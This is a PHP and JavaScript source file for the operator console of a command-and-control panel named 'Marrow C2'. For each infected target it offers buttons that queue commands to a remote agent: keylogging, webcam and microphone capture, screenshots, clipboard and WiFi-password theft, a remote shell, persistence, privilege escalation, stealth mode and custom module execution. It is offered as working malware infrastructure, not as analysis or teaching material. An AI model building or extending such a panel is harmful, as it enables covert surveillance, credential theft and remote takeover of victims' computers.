<?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth();
// Marrow C2 - Target Control Room
// Modular architecture with professional UI modules
require_once __DIR__ . '/../includes/Target.php';

$hwid = $_GET['id'] ?? null;
if (!$hwid) {
    header('Location: /pages/targets.php');
    exit;
}

$t = (new Target())->get($hwid);
if (!$t) {
    header('Location: /pages/targets.php');
    exit;
}

$name = $t['nickname'] ?: $t['hostname'] ?: $hwid;
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MARROW - <?= htmlspecialchars($name) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <link
        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"
        rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#6366f1',
                        accent: '#10b981',
                        danger: '#ef4444',
                        warning: '#f59e0b',
                        bg: '#030712',
                        card: '#0a0f1a',
                        surface: '#0f1219',
                        border: '#1e2433',
                        hover: '#1a1f2e'
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui'],
                        mono: ['JetBrains Mono', 'monospace']
                    }
                }
            }
        }
    </script>
    <style>
        * {
            scrollbar-width: thin;
            scrollbar-color: #333 transparent;
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 3px;
        }
    </style>
</head>

<body class="bg-bg text-gray-200 font-sans h-screen flex flex-col overflow-hidden">

    <!-- HEADER -->
    <header class="h-14 bg-card border-b border-border flex items-center justify-between px-4 flex-shrink-0">
        <div class="flex items-center gap-4">
            <a href="/pages/targets.php"
                class="w-10 h-10 bg-hover hover:bg-border rounded-xl flex items-center justify-center transition-colors">
                <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                </svg>
            </a>
            <div class="flex items-center gap-3">
                <div
                    class="w-10 h-10 rounded-xl bg-gradient-to-br from-primary/30 to-accent/30 flex items-center justify-center text-xl">
                    💻</div>
                <div>
                    <input type="text" id="nickname" value="<?= htmlspecialchars($t['nickname'] ?? '') ?>"
                        placeholder="<?= htmlspecialchars($name) ?>"
                        class="bg-transparent text-white font-semibold text-lg w-56 focus:outline-none border-b-2 border-transparent hover:border-border focus:border-primary pb-0.5 transition-colors"
                        onchange="saveNickname(this.value)">
                    <div class="flex items-center gap-3 text-xs text-gray-500 mt-0.5">
                        <span class="font-mono"><?= htmlspecialchars($hwid) ?></span>
                        <span>•</span>
                        <span><?= htmlspecialchars($t['ip_address'] ?? '-') ?></span>
                    </div>
                </div>
            </div>
        </div>
        <div class="flex items-center gap-3">
            <div id="status-badge" class="flex items-center gap-2 px-4 py-2 bg-hover rounded-xl border border-border">
                <div id="status-dot" class="w-2.5 h-2.5 rounded-full bg-gray-500"></div>
                <span id="status-text" class="text-sm text-gray-400">Connecting...</span>
            </div>
            <button disabled onclick="resetAgent()"
                class="px-4 py-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-500 border border-orange-500/30 rounded-xl text-sm font-medium transition-colors">
                🔄 Reset
            </button>
            <button onclick="killAgent()"
                class="px-4 py-2 bg-danger/10 hover:bg-danger/20 text-danger border border-danger/30 rounded-xl text-sm font-medium transition-colors">
                ⚠️ Kill Agent
            </button>
        </div>
    </header>

    <!-- MAIN LAYOUT -->
    <div class="flex-1 flex overflow-hidden">

        <!-- SIDEBAR -->
        <aside class="w-64 bg-card border-r border-border flex flex-col">
            <!-- Quick Actions -->
            <div class="p-3 border-b border-border">
                <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-2 px-1">Quick Actions</div>
                <div class="grid grid-cols-4 gap-1.5">
                    <button onclick="loadModule('gallery'); setTimeout(()=>qc('screenshot'),500)"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="Take Screenshot">📸</button>
                    <button onclick="qc('webcam')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="Capture Webcam">📷</button>
                    <button onclick="qc('clipboard')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="Get Clipboard">📋</button>
                    <button onclick="loadModule('monitor')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="System Monitor">ℹ️</button>
                    <button onclick="loadModule('location')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="Location">📍</button>
                    <button onclick="loadModule('processes')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="Processes">⚙️</button>
                    <button onclick="loadModule('wifi')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="WiFi Passwords">📶</button>
                    <button onclick="loadModule('apps')"
                        class="aspect-square bg-hover hover:bg-border rounded-lg flex items-center justify-center text-lg transition-colors"
                        title="Installed Apps">📦</button>
                </div>
            </div>

            <!-- Module Navigation -->
            <div class="flex-1 overflow-auto p-2 space-y-1">
                <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-2 px-2">Modules</div>
                <button onclick="loadModule('files')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="files">
                    <span class="text-lg">📁</span> File Manager
                </button>
                <button onclick="loadModule('screen')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="screen">
                    <span class="text-lg">🖥️</span> Live Screen
                </button>
                <button onclick="loadModule('wifi')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="wifi">
                    <span class="text-lg">📶</span> WiFi Manager
                </button>
                <button onclick="loadModule('processes')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="processes">
                    <span class="text-lg">⚙️</span> Processes
                </button>
                <button onclick="loadModule('keylogger')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="keylogger">
                    <span class="text-lg">⌨️</span> Keylogger
                </button>
                <button onclick="loadModule('shell')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="shell">
                    <span class="text-lg">>_</span> Shell
                </button>
                <button onclick="loadModule('apps')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="apps">
                    <span class="text-lg">📦</span> Apps
                </button>
                <button onclick="loadModule('persistence')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="persistence">
                    <span class="text-lg">🔒</span> Persistence
                </button>
                <button onclick="loadModule('monitor')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="monitor">
                    <span class="text-lg">📊</span> Monitor
                </button>
                <button onclick="loadModule('custom_modules')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors bg-accent/10 border border-accent/30"
                    data-module="custom_modules">
                    <span class="text-lg">🧩</span> Custom Modules
                </button>
                <button onclick="loadModule('location')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="location">
                    <span class="text-lg">📍</span> Location
                </button>
                <button onclick="loadModule('clipboard')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="clipboard">
                    <span class="text-lg">📋</span> Clipboard
                </button>
                <button onclick="loadModule('privesc')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="privesc">
                    <span class="text-lg">👑</span> Priv Esc
                </button>
                <button onclick="loadModule('webcam')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="webcam">
                    <span class="text-lg">📹</span> Webcam
                </button>
                <button onclick="loadModule('microphone')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="microphone">
                    <span class="text-lg">🎤</span> Microphone
                </button>
                <button onclick="loadModule('gallery')"
                    class="nav-btn w-full text-left px-3 py-2.5 rounded-xl text-sm flex items-center gap-2.5 transition-colors"
                    data-module="gallery">
                    <span class="text-lg">🖼️</span> Gallery
                </button>
            </div>

            <!-- Notes -->
            <div class="p-3 border-t border-border">
                <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-2">Notes</div>
                <textarea id="notes"
                    class="w-full h-24 bg-hover border border-border rounded-xl p-3 text-xs resize-none focus:outline-none focus:border-primary transition-colors"
                    placeholder="Add notes..."
                    onchange="saveNotes(this.value)"><?= htmlspecialchars($t['notes'] ?? '') ?></textarea>
            </div>
        </aside>

        <!-- MAIN CONTENT -->
        <main id="module-container" class="flex-1 overflow-hidden">
            <!-- Module content loads here -->
        </main>

        <!-- OUTPUT PANEL -->
        <aside class="w-80 bg-card border-l border-border flex flex-col">
            <div class="px-4 py-3 border-b border-border flex items-center justify-between">
                <span class="text-sm font-medium text-white">📡 Output</span>
                <button onclick="clearOutput()"
                    class="text-xs text-gray-500 hover:text-white transition-colors">Clear</button>
            </div>
            <div id="output" class="flex-1 overflow-auto p-3 space-y-2"></div>
        </aside>
    </div>

    <script>
        const HWID = '<?= addslashes($hwid) ?>';
        let currentModule = null;
        let seenTasks = new Set();

        // === OUTPUT (defined first so queueCommand can use it) ===
        function addOutput(text, type = 'info') {
            const out = document.getElementById('output');
            if (!out) return;
            const div = document.createElement('div');
            div.className = `p-3 rounded-xl text-xs font-mono break-all ${type === 'pending' ? 'bg-hover border border-border text-gray-400' :
                type === 'error' ? 'bg-danger/10 border border-danger/30 text-danger' :
                    'bg-surface border border-border text-gray-300'
                }`;
            div.textContent = typeof text === 'object' ? JSON.stringify(text, null, 2) : text;
            out.insertBefore(div, out.firstChild);
            if (out.children.length > 50) out.removeChild(out.lastChild);
        }

        function clearOutput() {
            document.getElementById('output').innerHTML = '';
        }

        // === QUEUE COMMAND (GLOBAL - needed by modules) ===
        window.queueCommand = async function (module, args = '') {
            addOutput(`▶ ${module}`, 'pending');
            const fd = new FormData();
            fd.append('action', 'queue');
            fd.append('hwid', HWID);
            fd.append('module', module);
            fd.append('args', args);
            await fetch('/api/dashboard.php', { method: 'POST', body: fd });
        };

        // Shorthand (also global)
        window.qc = function (m, a = '') { window.queueCommand(m, a); };

        // === MODULE LOADING ===
        async function loadModule(name) {
            // Update nav
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('bg-primary/10', 'text-primary', 'border', 'border-primary/20');
                btn.classList.add('bg-hover', 'hover:bg-border', 'text-gray-300');
            });
            const activeBtn = document.querySelector(`[data-module="${name}"]`);
            if (activeBtn) {
                activeBtn.classList.remove('bg-hover', 'hover:bg-border', 'text-gray-300');
                activeBtn.classList.add('bg-primary/10', 'text-primary', 'border', 'border-primary/20');
            }

            // Load module
            currentModule = name;
            const container = document.getElementById('module-container');

            try {
                const html = await fetch(`/modules/ui/${name}.php`).then(r => r.text());
                container.innerHTML = html;

                // Execute scripts from loaded module
                container.querySelectorAll('script').forEach(oldScript => {
                    const newScript = document.createElement('script');
                    if (oldScript.src) {
                        newScript.src = oldScript.src;
                    } else {
                        newScript.textContent = oldScript.textContent;
                    }
                    document.body.appendChild(newScript);
                    oldScript.remove();
                });

                // Initialize module after scripts are loaded
                setTimeout(() => {
                    if (name === 'files' && typeof FM !== 'undefined') FM.init();
                    if (name === 'screen' && typeof LS !== 'undefined') { /* Already initialized */ }
                    if (name === 'wifi' && typeof WIFI !== 'undefined') WIFI.refresh();
                    if (name === 'processes' && typeof PROC !== 'undefined') PROC.refresh();
                    if (name === 'persistence' && typeof PERSIST !== 'undefined') PERSIST.refresh();
                }, 100);
            } catch (e) {
                container.innerHTML = `<div class="flex items-center justify-center h-full text-gray-500">Failed to load module: ${e.message}</div>`;
            }
        }

        // === SETTINGS ===
        async function saveNickname(v) {
            const fd = new FormData();
            fd.append('action', 'update_target');
            fd.append('hwid', HWID);
            fd.append('nickname', v);
            await fetch('/api/dashboard.php', { method: 'POST', body: fd });
        }

        async function saveNotes(v) {
            const fd = new FormData();
            fd.append('action', 'update_target');
            fd.append('hwid', HWID);
            fd.append('notes', v);
            await fetch('/api/dashboard.php', { method: 'POST', body: fd });
        }

        function killAgent() {
            if (!confirm('Are you sure you want to terminate the agent process? Connection will be lost permanently.')) return;
            queueCommand('kill');
            setTimeout(() => window.location.href = '../index.php', 1000);
        }

        function resetAgent() {
            if (!confirm('Hard Reset? This will remove persistence, clean files, and restart the agent process.')) return;
            queueCommand('reset');
            // Give it time to receive command then redirect
            setTimeout(() => window.location.href = '../index.php', 1000);
        }
        // === POLLING ===
        async function poll() {
            // Status
            try {
                const t = await fetch(`/api/dashboard.php?action=target&hwid=${HWID}`).then(r => r.json());
                const online = t?.is_online;
                document.getElementById('status-dot').className = `w-2.5 h-2.5 rounded-full ${online ? 'bg-accent animate-pulse' : 'bg-danger'}`;
                document.getElementById('status-text').textContent = online ? `Online (${t.seconds_ago}s)` : 'Offline';
                document.getElementById('status-text').className = `text-sm ${online ? 'text-accent' : 'text-danger'}`;
            } catch (e) { }

            // Tasks
            try {
                const tasks = await fetch(`/api/dashboard.php?action=tasks&hwid=${HWID}`).then(r => r.json());

                tasks.filter(t => t.status === 'completed' && !seenTasks.has(t.id)).forEach(t => {
                    seenTasks.add(t.id);
                    const r = t.result || '';

                    // Route to module handlers
                    if (t.module_name === 'drives' && typeof FM !== 'undefined') FM.renderDrives(r);
                    if (t.module_name === 'files' && typeof FM !== 'undefined') FM.renderFiles(r);
                    if (t.module_name === 'file_read' && typeof FM !== 'undefined') FM.handleFileRead(r);
                    if (t.module_name === 'screenshot_live' && typeof LS !== 'undefined') LS.render(r);
                    if (t.module_name === 'wifi' && typeof WIFI !== 'undefined') WIFI.render(r);
                    if (t.module_name === 'processes' && typeof PROC !== 'undefined') PROC.render(r);
                    if ((t.module_name === 'persistence_check' || t.module_name === 'persistence_install' || t.module_name === 'persistence_remove') && typeof PERSIST !== 'undefined') PERSIST.render(r);
                    if ((t.module_name.startsWith('keylogger')) && typeof KL !== 'undefined') KL.handleResult(r);
                    if ((t.module_name === 'shell' || t.module_name === 'powershell') && typeof SHELL !== 'undefined') SHELL.handleResult(r);
                    if (t.module_name === 'installed' && typeof APPS !== 'undefined') APPS.render(r);
                    if (t.module_name === 'sysinfo' && typeof MONITOR !== 'undefined') MONITOR.render(r);
                    if (t.module_name === 'location' && typeof LOC !== 'undefined') LOC.render(r);
                    if (t.module_name === 'location_geo' && typeof LOC !== 'undefined') LOC.render(r);
                    if (t.module_name === 'clipboard' && typeof CLIP !== 'undefined') CLIP.render(r);
                    if (t.module_name === 'clipboard_image' && typeof CLIP !== 'undefined') CLIP.renderImage(r);
                    if ((t.module_name === 'privilege_check' || t.module_name === 'privilege_escalate' || t.module_name === 'stealth_enable') && typeof PRIV !== 'undefined') PRIV.render(r);
                    if (t.module_name === 'webcam' && typeof CAM !== 'undefined') CAM.render(r);
                    if (t.module_name === 'webcam_live' && typeof CAM !== 'undefined') CAM.renderLive(r);
                    if (t.module_name === 'microphone' && typeof MIC !== 'undefined') MIC.render(r);
                    if (t.module_name === 'execute_custom' && typeof CM !== 'undefined') CM.handleResult(r);

                    // Add to output
                    const preview = r.length > 100 ? r.substring(0, 100) + '...' : r;
                    addOutput(`${t.module_name}: ${preview}`);
                });
            } catch (e) { }
        }

        // === INIT ===
        setInterval(poll, 1000);
        poll();
        loadModule('files');
    </script>
</body>

</html>
